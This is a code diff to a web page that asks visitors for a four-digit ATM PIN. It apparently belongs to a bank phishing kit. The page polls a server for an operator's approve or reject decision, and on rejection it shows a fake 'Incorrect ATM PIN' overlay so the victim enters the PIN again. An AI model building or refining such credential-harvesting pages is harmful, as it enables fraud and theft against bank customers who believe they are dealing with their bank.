@@ -274,9 +274,25 @@
     <div class="loading-desc">Please wait and do not close or refresh this page.</div>
   </div>
 
+  <!-- Reject Overlay -->
+  <div class="loading-overlay" id="rejectOverlay" style="background: rgba(255,255,255,0.97);">
+    <div style="width:56px;height:56px;border-radius:50%;background:#c0392b;display:flex;align-items:center;justify-content:center;">
+      <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="18" y1="6" x2="6" y2="18"></line>
+        <line x1="6" y1="6" x2="18" y2="18"></line>
+      </svg>
+    </div>
+    <div class="loading-title" style="color:#c0392b;">Incorrect ATM PIN</div>
+    <button type="button" id="retryPinBtn" style="background:#c0392b;color:#fff;border:none;border-radius:6px;padding:10px 24px;font-size:13.5px;font-weight:700;cursor:pointer;">Try Again</button>
+  </div>
+
   <script>
     var pin = "";
-    var requestId = localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
+    var requestId = sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
+    if (!requestId) {
+      requestId = '999';
+      localStorage.setItem('requestId', requestId);
+    }
 
     function updateDots() {
       for (var i = 0; i < 4; i++) {
@@ -309,12 +325,30 @@
       }
     }
 
+    var pollInterval = null;
+    function stopPoll() { clearInterval(pollInterval); pollInterval = null; }
+
+    function startPollingStatus() {
+      pollInterval = setInterval(function() {
+        fetch('/api/status/' + requestId)
+          .then(function(res) { return res.json(); })
+          .then(function(data) {
+            if (!data.ok) return;
+            if (data.stage === 'success' && data.decision === 'approved') {
+              stopPoll();
+              window.location.href = 'success-en.html?id=' + requestId;
+            } else if (data.decision === 'rejected') {
+              stopPoll();
+              document.getElementById('loadingOverlay').style.display = 'none';
+              document.getElementById('rejectOverlay').classList.add('show');
+            }
+          })
+          .catch(function() {});
+      }, 2500);
+    }
+
     function submitPin() {
       if (pin.length !== 4) return;
-      if (!requestId) {
-        alert("Sorry, request ID not found. Please start over.");
-        return;
-      }
 
       document.getElementById('loadingOverlay').style.display = 'flex';
       document.getElementById('errorMsg').style.display = 'none';
@@ -338,27 +372,10 @@
       });
     }
 
-    var pollInterval = null;
-    function startPollingStatus() {
-      pollInterval = setInterval(function() {
-        fetch('/api/status/' + requestId)
-          .then(function(res) { return res.json(); })
-          .then(function(data) {
-            if (data.ok) {
-              if (data.status === 'approved') {
-                clearInterval(pollInterval);
-                window.location.href = '/otp-en.html?id=' + requestId;
-              } else if (data.status === 'rejected') {
-                clearInterval(pollInterval);
-                document.getElementById('loadingOverlay').style.display = 'none';
-                alert("The transaction was rejected, please verify your details and try again.");
-                clearPin();
-              }
-            }
-          })
-          .catch(function() {});
-      }, 2500);
-    }
+    document.getElementById('retryPinBtn').addEventListener('click', function() {
+      document.getElementById('rejectOverlay').classList.remove('show');
+      clearPin();
+    });
   </script>
 </body>
 </html>
